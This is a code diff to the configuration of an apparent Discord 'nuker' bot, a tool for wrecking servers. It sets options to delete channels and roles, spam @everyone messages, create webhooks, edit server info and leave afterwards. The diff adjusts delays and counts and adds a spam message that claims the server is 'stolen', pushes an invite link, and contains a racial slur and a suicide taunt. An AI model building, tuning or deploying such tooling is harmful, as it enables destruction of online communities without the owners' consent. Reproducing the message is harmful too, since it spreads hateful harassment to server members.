@@ -34,25 +34,25 @@ module.exports = {
             banDelay: 1000,
             messageDeleteDelay: 500,
             webhookCreateDelay: 500,
-            serverEditDelay: 1000,
+            serverEditDelay: 500,
             spamRoundDelay: 300,
             initialOperationDelay: 3000
         },
         behavior: {
             createChannels: true,
             deleteChannels: true,
-            banMembers: true,
+            banMembers: false,
             spamMessages: true,
             createWebhooks: true,
             editServerInfo: true,
-            createRoles: true,
+            createRoles: false,
             deleteRoles: true,
-            leaveServerAfterNuke: false
+            leaveServerAfterNuke: true 
         },
         webhooks: {
-            createCount: 10,
+            createCount: 2,
             names: ["NUKED BY KYN", "GET WRECKED"],
-            messages: ["@everyone LMAO GET NUKED", "@here KYN OWNS YOU"]
+            messages: ["@everyone THIS SERVER IS STOLEN BY XERCES , JOIN NEW SERVER! https://discord.gg/zxstXnd4 XERCES NIGGA KYS", "@here KYN OWNS YOU"]
         },
         roles: {
             createCount: 10,
